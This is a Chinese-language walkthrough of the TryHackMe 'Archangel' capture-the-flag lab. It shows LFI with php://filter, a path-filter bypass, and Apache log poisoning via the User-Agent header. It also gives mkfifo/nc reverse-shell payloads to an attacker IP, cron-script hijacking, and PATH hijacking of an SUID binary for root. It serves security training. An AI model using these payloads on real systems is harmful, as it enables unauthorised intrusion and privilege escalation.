# Archangel

一家著名的安全解决方案公司似乎正在他们的实时机器上进行一些测试。利用它的最佳时机。

---

这几天刷的都是中等难度的web的题，也快春节了，眼看中等难度的题越刷越少，还是留一点给以后玩。

现在开始玩玩简单难度的题，刷刷分

到春节我要开始挑战Hololive，加强自己的Windows AD能力，到那时候我会尝试适应添加截图的，毕竟之前我所有的文章都没有截图。

---

## 端口扫描

循例 nmap 扫：

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

## Web枚举

进入web一看，一套网页模板，题目要我们找到其域名，

在默认页面：

    Send us a mail:
    support@mafialive.thm

非常明显就是mafialive.thm

将其添加到/etc/hosts

访问mafialive.thm即可获得第一个flag

## gobuster，你走吧不需要你了

好巧不巧，我在翻看burp的请求日志的时候，发现mafialive.thm/访问了robots.txt:

    User-agent: *
    Disallow: /test.php

该页面就是测试页面：

    Test Page. Not to be Deployed

## LFI

该页面有一个按钮，点击后，很明显

妥妥一个文件包含

    http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

回显：

    Control is an illusion 

此文件是php文件这是执行后的结果

我们需要阅读它的源码，php://filter可以帮助我们

使用php://filter来对目标页面进行base64编码

    ?view=php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php

将base64解码：

    <?php echo 'Control is an illusion'; ?>

好吧，什么屁用都没有

现在我们已知的php页面就两个，第一个我们已经看了，还剩一个那就是test.php，我们也看一下这个php的源码

    ?view=php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/test.php

关键代码：

    <?php

            //FLAG: thm{e*********1}

                function containsStr($str, $substr) {
                    return strpos($str, $substr) !== false;
                }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                    include $_GET['view'];
                }else{

            echo 'Sorry, Thats not allowed';
                }
        }
    ?>

这段代码比较简单，一个简单的判断

绕过也很简单，只要使用./隔开../即可：

    .././.././.././../

## LFI 进一步利用

现在我们可以访问任意文件，但是为了进一步利用，我们需要找到我们可控的文件

在这种情况下，日志文件绝对是首选

通过抓包查看响应头，或者使用浏览器的wappalyzer，我们可以得知：

    Server: Apache/2.4.29 (Ubuntu)

二话不说，直接找apache的日志文件：

    ?view=/var/www/html/development_testing/.././.././.././.././.././.././.././../var/log/apache2/access.log

我很后悔刚刚使用gobuster扫了一下

    .......././.././.././.././../var/apache2/error.log HTTP/1.1" 200 436 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

可以看到ua，ua我们可控

## 上burp - Reverse shell

将刚刚的请求丢进repeater

修改请求头的ua：

    GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././../var/log/apache2/access.log HTTP/1.1

    User-Agent: <?php phpinfo();?>

发送该包两次，我们就能成功看到phpinfo

接下来我们以此getshell

payload:

     <?php system('mkfifo /tmp/f1;nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1');?>

将其写到ua上

开启nc监听，请求两次access.log

成功getshell

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nc -vlnp 8888
    Ncat: Version 7.93 ( https://nmap.org/ncat )
    Ncat: Listening on :::8888
    Ncat: Listening on 0.0.0.0:8888
    Ncat: Connection from 10.10.221.93.
    Ncat: Connection from 10.10.221.93:49680.
    whoami
    www-data

升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"

user.txt:

    cd /home/archangel
    www-data@ubuntu:/home/archangel$ ls -la
    ls -la
    total 44
    drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
    drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
    -rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
    -rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
    drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
    drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
    -rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
    -rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
    drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
    drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
    -rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
    www-data@ubuntu:/home/archangel$ cat ./user.txt

myfiles文件夹：

    www-data@ubuntu:/home/archangel$ ls -la ./myfiles
    ls -la ./myfiles
    total 12
    drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 .
    drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 ..
    -rw-r--r-- 1 root      root        44 Nov 18  2020 passwordbackup
    www-data@ubuntu:/home/archangel$ cat ./myfiles/passwordbackup
    cat ./myfiles/passwordbackup
    youtube/watch?v=dQw4w9WgXcQ

## 横向移动

    www-data@ubuntu:/home/archangel$ ls -la /opt
    ls -la /opt
    total 16
    drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
    drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
    drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
    -rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh

查看helloworld.sh：

    cat ./helloworld.sh
    #!/bin/bash
    echo "hello world" >> /opt/backupfiles/helloworld.txt

接下来都不用看了，定时任务，并且我们还有权限修改该脚本文件，直接再次reverse shell移动到archangel用户

payload:

    echo "mkfifo /tmp/f1;nc 10.14.39.48 9999 < /tmp/f1 | /bin/bash > /tmp/f1" >> ./helloworld.sh

成功getshell

    Ncat: Connection from 10.10.221.93.
    Ncat: Connection from 10.10.221.93:39692.
    python3 -c "import pty;pty.spawn('/bin/bash')"
    archangel@ubuntu:~$ id
    id
    uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)

user2.txt: 现在我们有权访问secret文件夹了

    archangel@ubuntu:~$ cd ./secret
    cd ./secret
    archangel@ubuntu:~/secret$ ls -la
    ls -la
    total 32
    drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
    drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
    -rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
    -rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

## 环境变量 - 纵向移动|权限提升

secret文件夹下还有有个backup文件并且带suid:

    -rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup

直接cat，发现是可执行文件

直接执行：

    archangel@ubuntu:~/secret$ ./backup
    ./backup
    cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

该程序会将home/user/archangel/myfiles/下进行复制

但事实上我们根本没有权限在/home下创建文件夹

所以我们可以篡改环境变量来执行我们的恶意程序以达到目的

    touch ./cp

写入以下内容：

    archangel@ubuntu:~/secret$ echo '#!/bin/bash' > ./cp
    archangel@ubuntu:~/secret$ echo "/bin/bash -p" >> ./cp

记得修改权限使其可执行：

    archangel@ubuntu:~/secret$ chmod 777 ./cp

修改环境变量：

    archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH

再次执行backup，成功getroot

    root@ubuntu:~/secret# id
    id
    uid=0(root) gid=0(root) groups=0(root),1001(archangel)
    root@ubuntu:~/secret# cat /root/root.txt
